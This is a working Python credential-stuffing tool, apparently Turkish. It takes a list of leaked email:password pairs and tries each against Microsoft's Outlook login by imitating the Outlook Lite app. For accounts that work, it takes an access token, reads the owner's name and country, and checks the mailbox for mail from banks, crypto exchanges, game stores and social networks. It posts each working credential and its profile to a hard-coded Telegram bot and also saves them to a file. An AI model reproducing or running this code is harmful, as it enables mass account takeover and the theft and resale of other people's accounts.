import requests
from concurrent.futures import ThreadPoolExecutor

a, b = 0, 0
Tok = "8149331862:AAF2i7LRP717LzXF5pPiut3TbZRL_HvcYBk"
id = "6077249114"
file = input('📍Combo dosya yolu gir: ')

services = {
    "Facebook": ["security@facebookmail.com"],
    "Instagram": ["security@mail.instagram.com"],
    "TikTok": ["register@account.tiktok.com", "noreply@tiktok.com"],
    "Twitter": ["info@x.com"],
    "BluTV": ["destek@blutv.com", "info@blutv.com"],
    "Midasbuy": ["help@midasbuy.com"],
    "Predunyam": ["destek@predunyam.com"],
    "GitHub": ["noreply@github.com", "support@github.com"],
    "Supercell": ["noreply@id.supercell.com"],
    "EA Sports": ["EA@e.ea.com"],
    "PUBG": ["noreply@pubgmobile.com"],
    "Microsoft": ["account-security-noreply@accountprotection.microsoft.com"],
    "Steam": ["noreply@steampowered.com"],
    "Roblox": ["accounts@roblox.com"],
    "Spotify": ["no-reply@spotify.com"],
    "Rockstar": ["noreply@rockstargames.com"],
    "EpicGames": ["help@acct.epicgames.com"],
    "PlayStation": ["reply@txn-email.playstation.com"],
    "Xbox": ["xboxreps@engage.xbox.com"],
    "Netflix": ["info@account.netflix.com", "no-reply@mailer.netflix.com"],
    "PayPal": ["service@paypal.com.br"],
    "Binance": ["do-not-reply@ses.binance.com"],
    "Bitkub": ["no-reply@bitkub.com"],
    "Apple": ["appleid@id.apple.com"],
    "LinkedIn": ["security-noreply@linkedin.com"],
    "Amazon": ["account-update@amazon.com", "no-reply@amazon.com"],
    "Telegram": ["login@telegram.org"],
    "Yahoo": ["account-security@cc.yahoo-inc.com"],
    "AliExpress": ["notification@notice.aliexpress.com"],
    "OnlyFans": ["support@onlyfans.com"],
    "Payoneer": ["do_not_reply@payoneer.com"],
    "Google": ["no-reply@accounts.google.com"],
    "Nintendo": ["nintendo-noreply@ccg.nintendo.com"],
    "Deezer": ["no-reply@deezer.com"],
    "GOG": ["no-reply@gog.com"],
    "Ubisoft": ["account@ubi.com", "noreply@ubi.com"],
    "Yandex": ["security@yandex.com"],
    "Mega": ["support@mega.nz"],
    "Reddit": ["noreply@reddit.com"],
    "ProtonMail": ["security@protonmail.com"],
    "Tumblr": ["no-reply@tumblr.com"],
    "Bigo": ["no-reply@bigo.tv"],
    "Zalo": ["no-reply@zalo.me"],
    "VK": ["security@vk.com"],
    "Discord": ["noreply@discord.com"],
    "Pinterest": ["noreply@account.pinterest.com"],
    "Dropbox": ["no-reply@dropbox.com"],
}

def get_infoo(Email, Password, token, CID):
    global a, b
    try:
        he = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Accept": "application/json"
        }
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he)

        if r.status_code != 200 or not r.text or "account.live.com adresinde oturum açın" in r.text:
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş (Microsoft hesabında sorun var): {Email} | {Password}')
            return

        try:
            r_json = r.json()
        except:
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş (JSON okunamadı): {Email} | {Password}')
            return

        info_name = r_json.get('names', [])
        info_Loca = r_json.get('accounts', [])
        if not info_name and not info_Loca:
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş (Profil bilgisi yok): {Email} | {Password}')
            return

        name = info_name[0].get('displayName', 'Bilinmiyor') if info_name else "Bilinmiyor"
        Loca = info_Loca[0].get('location', 'Bilinmiyor') if info_Loca else "Bilinmiyor"

        url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
        headers = {
            "authorization": f"Bearer {token}",
            "x-owa-sessionid": CID,
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)"
        }
        rese = requests.post(url, headers=headers, data="").text

        def status(domains):
            return '🟢' if any(d in rese for d in domains) else '🔴'

        result = f"""
✅ HOTMAİL FULL CHECKER 🔐

📧 Email: {Email}
🔐 Şifre: {Password}
👤 İsim: {name}
🌍 Ülke: {Loca}

Bağlantılar:"""
        for serv, mails in services.items():
            result += f"\n{serv}: {status(mails)}"
        result += "\n\n👑 @sikicikurucu"

        try:
            requests.post(f"https://api.telegram.org/bot{Tok}/sendMessage", data={"chat_id": id, "text": result})
        except Exception as te:
            print(f"[!] Telegram gönderim hatası: {te} - {Email}")

        try:
            with open("/storage/emulated/0/Download/Telegram/godhot.txt", "a", encoding="utf-8") as f:
                f.write(result + "\n" + "-"*60 + "\n")
        except Exception as fe:
            print(f"[!] Dosyaya yazılamadı: {fe} - {Email}")

        a += 1
        print(f'\033[92m{a} - Başarılı Giriş: {Email} | {Password}')

    except Exception as e:
        b += 1
        print(f"[!] get_infoo genel hata: {e} - {Email}")

def get_token(Email, Password, cook, hh):
    try:
        loc = hh.get('Location')
        if not loc or "code=" not in loc:
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş (Token alınamadı): {Email} | {Password}')
            return
        Code = loc.split('code=')[1].split('&')[0]
        CID = cook.get('MSPCID', '').upper()
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": Code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        response = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data)
        token = response.json().get("access_token")
        if token:
            get_infoo(Email, Password, token, CID)
        else:
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş (Token yok): {Email} | {Password}')
    except Exception as e:
        b += 1
        print(f"[!] get_token hata: {e} - {Email}")

def login_protocol(Email, Password, URL, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams):
    try:
        payload = (
            f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1&passwd={Password}&ps=2"
            f"&PPFT={PPFT}&PPSX=PassportR&NewUser=1&fspost=0&i21=0&isSignupPost=0&i19=9960"
        )
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
            "Referer": f"{AD}haschrome=1",
            "Cookie": f"MSPRequ={MSPRequ};uaid={uaid};RefreshTokenSso={RefreshTokenSso};MSPOK={MSPOK};OParams={OParams};"
        }
        res = requests.post(URL, data=payload, headers=headers, allow_redirects=False)
        cook = res.cookies.get_dict()
        hh = res.headers
        if any(k in cook for k in ["JSH", "JSHP", "ANON", "WLSSC"]):
            get_token(Email, Password, cook, hh)
        else:
            global b
            b += 1
            print(f'\033[91m{b} - Hatalı Giriş: {Email} | {Password}')
    except Exception as e:
        print(f"[!] login_protocol hata: {e} - {Email}")

def get_values(Email, Password):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N)",
            "X-Requested-With": "com.microsoft.outlooklite"
        }
        url = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1"
            f"&login_hint={Email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        res = requests.get(url, headers=headers)
        cookies = res.cookies.get_dict()
        text = res.text
        URL = text.split("urlPost:'")[1].split("'")[0]
        PPFT = text.split('name="PPFT" id="i0327" value="')[1].split('"')[0]
        AD = res.url.split('haschrome=1')[0]
        login_protocol(
            Email, Password, URL, PPFT, AD,
            cookies.get('MSPRequ', ''),
            cookies.get('uaid', ''),
            cookies.get('RefreshTokenSso', ''),
            cookies.get('MSPOK', ''),
            cookies.get('OParams', '')
        )
    except Exception as e:
        print(f"[!] get_values hata: {e} - {Email}")

# ✅ max_workers burada 20 olarak ayarlandı
executor = ThreadPoolExecutor(max_workers=20)
with open(file, "r", encoding="utf-8") as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        try:
            email, password = line.split(':', 1)
            executor.submit(get_values, email, password)
        except Exception as e:
            print(f"[!] Satır okunamadı: {e} - Satır: {line}")